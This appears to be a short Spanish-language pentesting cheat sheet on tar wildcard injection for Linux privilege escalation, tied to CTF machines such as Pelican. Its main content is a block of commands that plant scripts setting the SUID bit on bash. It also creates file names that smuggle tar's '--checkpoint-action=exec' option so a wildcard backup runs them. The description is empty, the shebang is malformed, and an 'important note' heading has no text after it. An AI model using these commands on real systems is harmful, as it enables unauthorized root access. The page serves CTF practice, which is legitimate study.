
## DESCRIPTION



#### Mas información
* https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks


## EXPLOITATION

```
echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh    

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1
```



## MACHINES

* Hack The Box: 
* PG: Pelican

**!!NOTA IMPORTANTE!!** 